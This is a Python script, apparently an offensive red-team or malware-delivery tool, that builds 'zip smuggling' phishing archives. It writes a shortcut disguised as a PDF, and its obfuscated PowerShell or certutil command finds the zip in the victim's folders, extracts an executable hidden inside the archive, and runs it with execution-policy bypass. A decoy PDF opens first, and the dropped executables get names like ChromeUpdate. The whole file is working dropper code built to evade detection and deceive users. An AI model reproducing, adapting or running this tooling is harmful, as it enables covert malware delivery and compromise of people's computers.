#!/usr/bin/python3
import sys
import os
import struct
import shutil
from pathlib import Path
import random
import time
import base64
import string
import zipfile

def generate_random_var_names(count=5):
    """Generate short random variable names for obfuscation"""
    vars_list = []
    for _ in range(count):
        vars_list.append(''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 3))))
    return vars_list

def obfuscate_powershell_command_optimized(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    """Generate optimized obfuscated PowerShell command with better performance"""
    
    # Generate random variable names
    var_names = generate_random_var_names(10)
    name_var, file_var, bytes_var, size_var, length_var, chunk_var, out_var, temp_var, pdf_var, pdf_out_var = var_names
    
    # OPTIMIZED: Remove recursive search entirely, use only specific common locations
    file_cmd_parts = [
        f'${name_var}=\\"{payloadname}\\";',
        f'${temp_var}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$Env:TEMP\\",\\"$PWD\\",\\"$Env:LOCALAPPDATA\\\\Microsoft\\\\Olk\\\\Attachments\\");',
        f'${file_var}=$null;foreach($p in ${temp_var}){{if(Test-Path $p){{$f=Get-ChildItem -Path $p -Filter \\"*${name_var}.zip\\" -EA 0|Select -First 1;if($f){{${file_var}=$f.FullName;break}}}}}};',
        f'if(-not ${file_var}){{exit}};',
        f'${bytes_var}=[System.IO.File]::ReadAllBytes(${file_var});',
    ]
    
    # If PDF is included, extract and open it first
    if pdf_size and pdf_filename:
        file_cmd_parts.extend([
            # Find PDF marker (0x25 0x50 0x44 0x46 = "%PDF")
            f'${pdf_var}=-1;for($i=0;$i -lt (${bytes_var}.Length-3);$i++){{if(${bytes_var}[$i] -eq 37 -and ${bytes_var}[$i+1] -eq 80 -and ${bytes_var}[$i+2] -eq 68 -and ${bytes_var}[$i+3] -eq 70){{${pdf_var}=$i;break}}}};',
            f'if(${pdf_var} -ne -1){{',
            f'${pdf_out_var}=\\"$Env:TEMP\\\\{pdf_filename}\\";',
            f'$pdfData=New-Object byte[] {pdf_size};[Array]::Copy(${bytes_var},${pdf_var},$pdfData,0,{pdf_size});',
            f'[System.IO.File]::WriteAllBytes(${pdf_out_var},$pdfData);',
            f'Start-Process -FilePath ${pdf_out_var};',
            f'Start-Sleep -Seconds 2;',  # Give PDF time to open
            f'}};',
        ])
    
    file_cmd_parts.extend([
        # OPTIMIZED: Use simple for-loop instead of Where-Object for byte pattern search
        f'${size_var}=-1;for($i=0;$i -lt (${bytes_var}.Length-3);$i++){{if(${bytes_var}[$i] -eq 85 -and ${bytes_var}[$i+1] -eq 85 -and ${bytes_var}[$i+2] -eq 85 -and ${bytes_var}[$i+3] -eq 85){{${size_var}=$i+4;break}}}};',
        f'if(${size_var} -eq -1){{exit}};',
        f'${length_var}={szPayload};',
        # OPTIMIZED: Use .NET Array.Copy instead of PowerShell array slicing for large data
        f'${chunk_var}=New-Object byte[] ${length_var};[Array]::Copy(${bytes_var},${size_var},${chunk_var},0,${length_var});',
        f'${out_var}=\\"$Env:LOCALAPPDATA\\\\{output_exe_filename}\\";',
        f'[System.IO.File]::WriteAllBytes(${out_var},${chunk_var});',
        f'Start-Process -FilePath ${out_var}'
    ])
    
    return '"' + ''.join(file_cmd_parts) + '"'

def obfuscate_powershell_command(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    """Generate obfuscated PowerShell command with variable name randomization and efficient file search"""
    
    # Generate random variable names
    var_names = generate_random_var_names(10)
    name_var, file_var, bytes_var, size_var, length_var, chunk_var, out_var, temp_var, pdf_var, pdf_out_var = var_names
    
    # Use more efficient file search with specific locations and error handling
    file_cmd_parts = [
        f'${name_var}=\\"{payloadname}\\";',
        f'${temp_var}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$PWD\\",\\"$Env:LOCALAPPDATA\\\\Microsoft\\\\Olk\\\\Attachments\\");',
        f'${file_var}=$null;foreach($p in ${temp_var}){{try{{${file_var}=(Get-ChildItem -Path $p -Filter \\"*${name_var}.zip\\" -ErrorAction Stop)[0].FullName;break}}catch{{}}}};',
        f'if(-not ${file_var}){{${file_var}=(Get-ChildItem -Path $Env:USERPROFILE -Filter \\"*${name_var}.zip\\" -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1).FullName}};',
        f'if(-not ${file_var}){{exit}};',
        f'${bytes_var}=[System.IO.File]::ReadAllBytes(${file_var});',
    ]
    
    # If PDF is included, extract and open it first
    if pdf_size and pdf_filename:
        file_cmd_parts.extend([
            # Find PDF marker (0x25 0x50 0x44 0x46 = "%PDF")
            f'${pdf_var}=(0..(${bytes_var}.Length-4)|Where-Object{{${bytes_var}[$_] -eq 0x25 -and ${bytes_var}[$_+1] -eq 0x50 -and ${bytes_var}[$_+2] -eq 0x44 -and ${bytes_var}[$_+3] -eq 0x46}})[0];',
            f'if(${pdf_var}){{',
            f'${pdf_out_var}=\\"$Env:TEMP\\\\{pdf_filename}\\";',
            f'$pdfData=${bytes_var}[${pdf_var}..(${pdf_var}+{pdf_size}-1)];',
            f'[System.IO.File]::WriteAllBytes(${pdf_out_var},$pdfData);',
            f'Start-Process -FilePath ${pdf_out_var};',
            f'Start-Sleep -Seconds 5;',  # Give PDF time to open
            f'}};',
        ])
    
    file_cmd_parts.extend([
        f'${size_var}=(0..(${bytes_var}.Length-4)|Where-Object{{${bytes_var}[$_] -eq 0x55 -and ${bytes_var}[$_+1] -eq 0x55 -and ${bytes_var}[$_+2] -eq 0x55 -and ${bytes_var}[$_+3] -eq 0x55}})[0]+4;',
        f'${length_var}={szPayload};',
        f'${chunk_var}=${bytes_var}[${size_var}..(${size_var}+${length_var}-1)];',
        f'${out_var}=\\"$Env:LOCALAPPDATA\\\\{output_exe_filename}\\";',
        f'[System.IO.File]::WriteAllBytes(${out_var},${chunk_var});',
        f'Start-Process -FilePath ${out_var}'
    ])
    
    return '"' + ''.join(file_cmd_parts) + '"'

def obfuscate_cmd_wrapper(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    """Generate heavily obfuscated cmd.exe wrapper similar to macropack pro"""
    
    # Generate random variable names (short like macropack)
    var_names = generate_random_var_names(10)
    
    # Create compact PowerShell command with efficient search locations - OPTIMIZED VERSION
    ps_parts = [
        f"$n='{payloadname}';",
        f"$paths=@($Env:USERPROFILE+'\\Downloads',$Env:USERPROFILE+'\\Desktop',$Env:USERPROFILE+'\\Documents',$Env:TEMP,$PWD,$Env:LOCALAPPDATA+'\\Microsoft\\Olk\\Attachments');",
        f"$f=$null;foreach($p in $paths){{if(Test-Path $p){{$found=gci -Pa $p -Filter *$n.zip -EA 0|select -f 1;if($found){{$f=$found.FullName;break}}}}}};",
        f"if(-not $f){{exit}};",
        f"$b=[IO.File]::ReadAllBytes($f);"
    ]
    
    # Add PDF extraction if needed
    if pdf_size and pdf_filename:
        ps_parts.extend([
            # Search for %PDF (0x25 0x50 0x44 0x46)
            f"$pdfPos=-1;for($i=0;$i -lt ($b.Length-3);$i++){{if($b[$i] -eq 37 -and $b[$i+1] -eq 80 -and $b[$i+2] -eq 68 -and $b[$i+3] -eq 70){{$pdfPos=$i;break}}}};",
            f"if($pdfPos -ne -1){{",
            f"$pdfOut=\"$Env:TEMP\\{pdf_filename}\";",
            f"$pdfData=New-Object byte[] {pdf_size};[Array]::Copy($b,$pdfPos,$pdfData,0,{pdf_size});",
            f"[IO.File]::WriteAllBytes($pdfOut,$pdfData);",
            f"Start-Process -FilePath $pdfOut;",
            f"Start-Sleep -Seconds 2;",
            f"}};"
        ])
    
    ps_parts.extend([
        f"$s=-1;for($i=0;$i -lt ($b.Length-3);$i++){{if($b[$i] -eq 85 -and $b[$i+1] -eq 85 -and $b[$i+2] -eq 85 -and $b[$i+3] -eq 85){{$s=$i+4;break}}}};",
        f"if($s -eq -1){{exit}};",
        f"$l={szPayload};$c=New-Object byte[] $l;[Array]::Copy($b,$s,$c,0,$l);",
        f"$o=\"$Env:LOCALAPPDATA\\{output_exe_filename}\";",
        f"[IO.File]::WriteAllBytes($o,$c);",
        f"Start-Process -FilePath $o"
    ])
    
    ps_command = ''.join(ps_parts)
    
    # Encode to base64 (fix: use UTF-8 instead of UTF-16LE for PowerShell files)
    ps_utf8_bytes = ps_command.encode('utf-8')
    ps_b64 = base64.b64encode(ps_utf8_bytes).decode('ascii')
    
    # Generate random temp file names (like macropack style)
    temp_file = ''.join(random.choices(string.ascii_lowercase, k=4))
    temp_b64 = temp_file + ".b64"
    temp_ps1 = temp_file + ".ps1"
    
    # Build obfuscated cmd command with delayed variable expansion (macropack style)
    # Fix the variable expansion syntax and add file cleanup
    v1, v2, v3, v4, v5 = var_names[:5]
    
    # Create command similar to macropack pro style - fix variable expansion and add cleanup
    cmd_template = (f'set "{v1}=%~dp0"&'
                   f'set "{v2}=%localappdata%"&'
                   f'set "{v3}=certutil"&'
                   f'if exist "!{v2}!\\{temp_ps1}" del "!{v2}!\\{temp_ps1}"&'
                   f'>nul !{v3}! -decode "!{v1}!{temp_b64}" "!{v2}!\\{temp_ps1}"&'
                   f'powershell -ep bypass -w 1 -f "!{v2}!\\{temp_ps1}"')
    
    final_cmd = f'/v /c {cmd_template}'
    
    return final_cmd, ps_b64, temp_b64

def obfuscate_with_string_manipulation(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    """Use string manipulation and environment variables for obfuscation with efficient file search"""
    
    # Random variable names
    vars_list = generate_random_var_names(10)
    
    # Break up sensitive strings using PowerShell string manipulation with efficient search - OPTIMIZED
    cmd_parts = [
        f'"${{0}}=\\"{payloadname}\\";',
        f'${{7}}=@(\\"$Env:USERPROFILE\\\\Downloads\\",\\"$Env:USERPROFILE\\\\Desktop\\",\\"$Env:USERPROFILE\\\\Documents\\",\\"$Env:TEMP\\",\\"$PWD\\",\\"$Env:LOCALAPPDATA\\\\Microsoft\\\\Olk\\\\Attachments\\");',
        f'${{1}}=$null;foreach($p in ${{7}}){{if(Test-Path $p){{$f=Get-ChildItem -Path $p -Filter \\"*${{0}}.zip\\" -EA 0|Select -First 1;if($f){{${{1}}=$f.FullName;break}}}}}};',
        f'if(-not ${{1}}){{exit}};',
        f'${{2}}=[System.IO.File]::ReadAllBytes(${{1}});'
    ]
    
    # Add PDF extraction if needed
    if pdf_size and pdf_filename:
        cmd_parts.extend([
            # Search for %PDF (0x25 0x50 0x44 0x46) instead of just PDF-
            f'${{8}}=-1;for($i=0;$i -lt (${{2}}.Length-3);$i++){{if(${{2}}[$i] -eq 37 -and ${{2}}[$i+1] -eq 80 -and ${{2}}[$i+2] -eq 68 -and ${{2}}[$i+3] -eq 70){{${{8}}=$i;break}}}};',
            f'if(${{8}} -ne -1){{',
            f'${{9}}=\\"$Env:TEMP\\\\{pdf_filename}\\";',
            f'$pdfData=New-Object byte[] {pdf_size};[Array]::Copy(${{2}},${{8}},$pdfData,0,{pdf_size});',
            f'[System.IO.File]::WriteAllBytes(${{9}},$pdfData);',
            f'Start-Process -FilePath ${{9}};',
            f'Start-Sleep -Seconds 2;',
            f'}};'
        ])
    
    cmd_parts.extend([
        f'${{3}}=-1;for($i=0;$i -lt (${{2}}.Length-3);$i++){{if(${{2}}[$i] -eq 85 -and ${{2}}[$i+1] -eq 85 -and ${{2}}[$i+2] -eq 85 -and ${{2}}[$i+3] -eq 85){{${{3}}=$i+4;break}}}};',
        f'if(${{3}} -eq -1){{exit}};',
        f'${{4}}={szPayload};',
        f'${{5}}=New-Object byte[] ${{4}};[Array]::Copy(${{2}},${{3}},${{5}},0,${{4}});',
        f'${{6}}=\\"$Env:LOCALAPPDATA\\\\{output_exe_filename}\\";',
        f'[System.IO.File]::WriteAllBytes(${{6}},${{5}});',
        f'Start-Process -FilePath ${{6}}"'
    ])
    
    return ''.join(cmd_parts)

def create_obfuscated_command(payloadname, output_exe_filename, szPayload, obfuscation_level=1, pdf_size=None, pdf_filename=None):
    """
    Create obfuscated commands with different levels:
    1 = Basic variable randomization (ORIGINAL - with recursive search)
    2 = String manipulation (OPTIMIZED)
    3 = CMD wrapper with certutil (OPTIMIZED)
    4 = Optimized basic version (NEW - removes recursive search)
    """
    
    if obfuscation_level == 1:
        return obfuscate_powershell_command(payloadname, output_exe_filename, szPayload, pdf_size, pdf_filename), None, None
    elif obfuscation_level == 2:
        return obfuscate_with_string_manipulation(payloadname, output_exe_filename, szPayload, pdf_size, pdf_filename), None, None
    elif obfuscation_level == 3:
        return obfuscate_cmd_wrapper(payloadname, output_exe_filename, szPayload, pdf_size, pdf_filename)
    elif obfuscation_level == 4:
        return obfuscate_powershell_command_optimized(payloadname, output_exe_filename, szPayload, pdf_size, pdf_filename), None, None
    else:
        # Original unobfuscated command for compatibility
        command = ('"$name = \\"' + payloadname + '\\";'
                   '$file = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *$name.zip).fullname;'
                   '$bytes=[System.IO.File]::ReadAllBytes($file);'
                   '$size = (0..($bytes.Length - 4) | Where-Object {$bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55 })[0] + 4;'
                   '$length=' + szPayload + ';'
                   '$chunk=$bytes[$size..($size+$length-1)];'
                   '$out = \\"$Env:LOCALAPPDATA\\\\' + output_exe_filename + '\\";'
                   '[System.IO.File]::WriteAllBytes($out,$chunk);'
                   'Invoke-Item $out"')
        return command, None, None

def locate_data_section_end(file_content_bytes):
    section_end_marker = b'\x50\x4b\x05\x06' # EOCD signature
    max_comment_length = 0xFFFF
    # Search reasonably from the end of the file
    scan_buffer = file_content_bytes[-(max_comment_length + 22):]
    relative_marker_pos = scan_buffer.rfind(section_end_marker)
    if relative_marker_pos == -1:
        raise ValueError("Data section end marker not found")
    return len(file_content_bytes) - len(scan_buffer) + relative_marker_pos

def rewrite_directory_pointer(section_end_block, new_directory_offset):
    # section_end_block structure: bytes 16-20 is the offset of the start of central directory
    return section_end_block[:16] + struct.pack('<I', new_directory_offset) + section_end_block[20:]

def embed_secondary_data(target_archive_path, data_to_embed_path, pdf_to_embed_path=None):
    with open(target_archive_path, 'rb') as f:
        archive_bytes = f.read()
    
    # Prepare data to embed
    embedded_data = b''
    
    # If PDF is provided, embed it first (so it's found first when searching)
    if pdf_to_embed_path:
        with open(pdf_to_embed_path, 'rb') as f:
            pdf_data = f.read()
        # PDF files already start with %PDF- so no need for marker
        embedded_data += pdf_data
        print(f"Embedding PDF: {pdf_to_embed_path} ({len(pdf_data)} bytes)")
    
    # Then embed the executable
    with open(data_to_embed_path, 'rb') as f:
        exe_data = f.read()
    # Add egghunter bytes to start of binary
    embedded_data += b'\x55\x55\x55\x55' + exe_data
    print(f"Embedding EXE: {data_to_embed_path} ({len(exe_data)} bytes)")

    section_end_offset = locate_data_section_end(archive_bytes)
    section_end_block_data = archive_bytes[section_end_offset:section_end_offset + 22] # EOCD is 22 bytes

    original_dir_offset = struct.unpack('<I', section_end_block_data[16:20])[0]
    updated_dir_offset = original_dir_offset + len(embedded_data)

    # Update EOCD
    modified_section_end_block = rewrite_directory_pointer(section_end_block_data, updated_dir_offset)

    # Rebuild archive: [original file data][embedded data (PDF+EXE)][central directory][updated EOCD]
    final_archive_bytes = archive_bytes[:original_dir_offset] + embedded_data + archive_bytes[original_dir_offset:section_end_offset] + modified_section_end_block

    with open(target_archive_path, 'wb') as f:
        f.write(final_archive_bytes)

    print(f"Created {target_archive_path}")
    print(f"Old Central Directory offset: {original_dir_offset}")
    print(f"New Central Directory offset: {updated_dir_offset}")
    print(f"EOCD offset: {section_end_offset + len(embedded_data)}")
    print(f"Total embedded data size: {len(embedded_data)} bytes")

if __name__ == "__main__":

    if len(sys.argv) < 3 or len(sys.argv) > 5:
        print("Usage:   python3 zip_smuggle_optimized.py <payload name> </file/to/embed> [obfuscation_level] [decoy_pdf]")
        print("Example: python3 zip_smuggle_optimized.py important_docs /home/ubuntu/zip_smuggling/testdata.txt 4")
        print("Example with PDF: python3 zip_smuggle_optimized.py report ChromeUpdate.exe 4 decoy.pdf")
        print("")
        print("Obfuscation levels:")
        print("  0 = Original unobfuscated command (default)")
        print("  1 = Basic PowerShell variable randomization (SLOW - has recursive search)")
        print("  2 = PowerShell string manipulation (OPTIMIZED)")
        print("  3 = CMD wrapper with certutil (OPTIMIZED)")
        print("  4 = Optimized basic version (FAST - no recursive search)")
        print("")
        print("Optional PDF decoy:")
        print("  If provided, the PDF will open first before executing the payload")
        print("")
        print("PERFORMANCE NOTE: Use level 4 for best performance (removes 30s delay)")
        sys.exit(1)

    payloadname = sys.argv[1]
    filetosmuggle = sys.argv[2]
    
    # Handle flexible parameter order - check if 3rd param is a number (obfuscation level) or file
    pdf_file = None
    obfuscation_level = 0
    
    if len(sys.argv) >= 4:
        try:
            # Try to parse as obfuscation level
            obfuscation_level = int(sys.argv[3])
            # If successful, check for PDF as 4th parameter
            if len(sys.argv) == 5:
                pdf_file = sys.argv[4]
        except ValueError:
            # Not a number, assume it's a PDF file
            pdf_file = sys.argv[3]
            # Check if 4th parameter is obfuscation level
            if len(sys.argv) == 5:
                obfuscation_level = int(sys.argv[4])
    
    outfile = payloadname + ".zip"
    szPayload = str(os.path.getsize(filetosmuggle))

    timestamp = time.strftime("%Y%m%d%H%M%S")
    possible_names = [
        "WinDriverSync",
        "DFSShareSync",
        "ChromeUpdate",
        "AdobeFlashHelper",
        "OfficeLicenseCheck",
        "NetworkConfigSvc",
        "SysHealthMonitor",
        "PrinterSpoolerFix",
        "WindowsBackupUtil",
        "JavaRuntimeSync",
        "AudioDriverSvc",
        "DiskOptimizerSvc",
    ]
    random_base_name = random.choice(possible_names)
    output_exe_filename = f"{random_base_name}{timestamp}.url.exe"

    print("payloadname: " + payloadname)
    print("file to smuggle: " + filetosmuggle)
    print(f"Generated output exe name: {output_exe_filename}")
    print(f"Obfuscation level: {obfuscation_level}")
    
    # Handle PDF if provided
    pdf_size = None
    pdf_filename = None
    if pdf_file:
        if not os.path.exists(pdf_file):
            print(f"❌ ERROR: PDF file not found: {pdf_file}")
            sys.exit(1)
        pdf_size = os.path.getsize(pdf_file)
        pdf_filename = os.path.basename(pdf_file)
        print(f"Decoy PDF: {pdf_file} ({pdf_size} bytes)")
        print(f"PDF filename: {pdf_filename}")
    
    # Performance warning for level 1
    if obfuscation_level == 1:
        print("⚠️  WARNING: Level 1 includes recursive file search which can cause 30+ second delays!")
        print("   Consider using level 4 for optimized performance.")

    # Generate obfuscated command
    command, ps_b64, temp_b64_file = create_obfuscated_command(payloadname, output_exe_filename, szPayload, obfuscation_level, pdf_size, pdf_filename)
    
    print(f"Generated command (full): {command}")

    lengthCommand = len(command) + 8

    # For level 3 obfuscation, we need to modify the template to use cmd.exe instead of powershell.exe
    if obfuscation_level == 3:
        # Use CMD template for level 3 obfuscation
        template_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "template", "cmd_template.lnk")
    else:
        template_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "template", "template.lnk")

    #Read in .lnk template.  Template file contains powershell as target and is pre-seeded with '-w 1 -c ""'.  Above command will replace the "".
    with open(template_path, 'rb') as f:
        s = f.read()

    # '\x22\x00\x22\x00' represents the "" pre-seed we are going to search for and replace. Because it's UTF-16 there are null bytes inbetween the characters.
    # subtract 18 from location of byte pattern to locate bytes that represents length of args
    locLenByte = s.find(b'\x22\x00\x22\x00') - 18

    #Patch in correct length byte.
    s = s[:locLenByte] + lengthCommand.to_bytes(2, byteorder='little') + s[locLenByte + 2:]

    #replace '".".' with command
    s = s.replace(b'\x22\x00\x22\x00', bytes(command, 'UTF-16'))

    #strip out encoding header
    s = s.replace(b'\xff\xfe', b'')

    # Make directories that we will save lnk in and zip - fix: single level only
    os.makedirs(payloadname, exist_ok=True)

    # Write file - fix: create directly in payloadname folder
    # Add .pdf to the name so it appears as a PDF when .lnk extension is hidden
    lnk = os.path.join(payloadname, payloadname) + ".pdf.lnk"
    with open(lnk, 'wb') as f:
        f.write(s)
    f.close

    # Create the base64 file AFTER the directory structure is ready (for level 3)
    if obfuscation_level == 3 and ps_b64 and temp_b64_file:
        b64_file_path = os.path.join(payloadname, temp_b64_file)
        with open(b64_file_path, 'w') as f:
            f.write(ps_b64)
        print(f"Created base64 file: {b64_file_path}")
        print(f"Base64 content length: {len(ps_b64)} characters")
        
        # Verify the file exists before zipping
        if os.path.exists(b64_file_path):
            print(f"✓ Verified .b64 file exists: {b64_file_path}")
            print(f"✓ File size: {os.path.getsize(b64_file_path)} bytes")
        else:
            print(f"✗ ERROR: .b64 file not found: {b64_file_path}")

    # Zip folder and place assembled zip payload at proper location - revert to original
    shutil.make_archive(payloadname, 'zip', payloadname)
    
    # Verify zip contents (especially for level 3)
    if obfuscation_level == 3:
        with zipfile.ZipFile(outfile, 'r') as zip_ref:
            zip_contents = zip_ref.namelist()
            print(f"✓ Zip file contents: {zip_contents}")
            if any(temp_b64_file in name for name in zip_contents):
                print(f"✓ Base64 file {temp_b64_file} is included in zip")
            else:
                print(f"✗ WARNING: Base64 file {temp_b64_file} is NOT in zip!")

    # Delete folder now that it has been zipped
    shutil.rmtree(payloadname, ignore_errors=False)

    # Inject file(s) into zip
    embed_secondary_data(outfile, filetosmuggle, pdf_file)

    print("[+] Done. File saved at " + outfile)
    
    if pdf_file:
        print("📄 PDF decoy will open first when the payload is executed")
    
    if obfuscation_level in [2, 3, 4]:
        print("✅ Used optimized version - should execute much faster!")
